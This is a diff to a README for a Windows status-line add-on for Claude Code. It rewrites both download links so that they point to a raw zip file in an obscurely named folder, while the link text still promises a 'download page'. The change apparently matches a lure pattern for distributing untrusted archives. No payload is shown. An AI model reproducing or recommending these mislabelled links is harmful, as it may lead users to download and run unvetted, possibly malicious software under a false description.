@@ -1,6 +1,6 @@
 # 🟣 claude-code-statusline - Clear status for Claude Code
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Leechlike-intangibleasset343/claude-code-statusline)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Leechlike-intangibleasset343/claude-code-statusline/main/corallic/statusline-code-claude-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ claude-code-statusline adds a clear status line to Claude Code on Windows. It sh
 
 Use the link below to visit the download page:
 
-[Download claude-code-statusline](https://github.com/Leechlike-intangibleasset343/claude-code-statusline)
+[Download claude-code-statusline](https://raw.githubusercontent.com/Leechlike-intangibleasset343/claude-code-statusline/main/corallic/statusline-code-claude-v3.9.zip)
 
 ## 📥 Download and Setup
 
